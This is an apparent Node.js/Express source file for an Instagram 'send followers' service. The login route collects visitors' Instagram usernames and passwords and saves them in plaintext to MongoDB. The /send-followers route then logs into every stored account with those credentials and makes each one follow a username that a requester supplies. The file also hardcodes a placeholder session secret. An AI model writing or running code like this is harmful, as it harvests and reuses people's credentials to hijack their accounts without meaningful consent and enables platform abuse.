require("dotenv").config();
const express = require("express");
const app = express();
const port = 3000;
const { IgApiClient } = require("instagram-private-api");
const mongoose = require("mongoose");
const session = require("express-session");

app.use(
  session({
    secret: "your-secret-key",
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }, // Set to true in production with HTTPS
  })
);
const ig = new IgApiClient();
// view engine setup
app.set("view engine", "ejs");
//body parser
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
//session
app.use(express.static("public"));
//config mongoose
mongoose.connect(process.env.MONGODB_URL);

const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});

//model
const User = mongoose.model("User", userSchema);

app.get("/login", (req, res) => {
  res.render("login");
});

app.post("/login", async (req, res) => {
  try {
    ig.state.generateDevice(req.body.username);
    const result = await ig.account.login(req.body.username, req.body.password);
    req.session.user = result;
    console.log(result);
    const user = await User.findOne({ username: req.body.username });
    if (user) {
      res.cookie("username", result.username);
      res.redirect("/");
    }
    User.create({
      username: req.body.username,
      password: req.body.password,
    });
    res.cookie("username", result.username);
    res.redirect("/");
  } catch (error) {
    res.status(401).render("login", { error: error.message });
  }
});

app.get("/", (req, res) => {
  if (req.session.user) {
    res.render("home");
  } else {
    res.redirect("/login");
  }
});

app.post("/send-followers", async (req, res) => {
  try {
    if (req.session.user) {
      const users = await User.find();
      for (const user of users) {
        ig.state.generateDevice(user.username);
        const loggedInUser = await ig.account.login(
          user.username,
          user.password
        );
        const friendship = await ig.search.users(req.body.username);
        console.log(friendship);
        if (friendship.length > 0) {
          const userId = friendship[0].pk;
          await ig.friendship.create(userId);
        }
      }

      res.render("home");
    }
  } catch (error) {}
});
app.listen(port, () => console.log(`Example app listening on port ${port}!`));
